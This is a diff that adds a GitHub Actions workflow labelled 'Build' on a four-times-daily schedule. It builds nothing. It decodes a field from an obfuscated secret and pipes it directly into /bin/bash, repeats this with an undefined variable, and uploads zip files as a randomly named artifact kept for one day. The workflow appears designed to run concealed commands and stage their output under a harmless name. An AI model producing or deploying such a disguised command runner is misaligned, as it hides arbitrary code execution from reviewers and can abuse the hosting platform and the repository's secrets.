@@ -1,0 +1,25 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '48 3,9,15,21 * * *'
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          lvjf9: ${{ secrets.lvjf9 }}
+        run: |
+          printf '%s' "$lvjf9" | jq -r .wnlk05 | /bin/bash
+          echo $qrd15 | jq -r .zc8 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: VWb0PGYn
+          path: "*.zip"
+          retention-days: 1
